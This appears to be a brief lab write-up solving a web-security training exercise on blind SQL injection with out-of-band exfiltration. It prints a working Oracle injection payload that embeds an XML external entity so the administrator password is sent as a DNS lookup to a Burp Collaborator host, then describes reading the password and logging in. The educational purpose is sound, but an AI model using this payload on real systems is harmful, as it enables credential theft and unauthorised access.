# Lab: Blind SQL injection with out-of-band data exfiltration

## Lab Desctiption

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/7bdcf941-2682-42dc-af83-528532fb5374)

## Solution

First go to Burp Collaborator and copy the subdoimain. Then edit the payload to recieve the administrator passowrd.

`x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.3aeit82uc92m3q1jtfqlnaomldr5fw3l.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
`
Use this payload and load the website once.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/51e60f2f-b05e-4ae5-94dc-b4620bf96c22)

When we go to Burp Collaborator again, in the polls we can domain name `fdab9w6fmj1ir17fyl88.3aeit82uc92m3q1jtfqlnaomldr5fw3l.oastify.com` . Here `3aeit82uc92m3q1jtfqlnaomldr5fw3l.oastify.com` is our domain name so we get `fdab9w6fmj1ir17fyl88` as the password for the `administrator.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/dc19de60-bb96-4bdd-90a3-6d063530be3d)

Using the passowrd found, logging in as administrator is successfull.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/04b5a6fc-2754-4d42-af41-edd9536f8717)
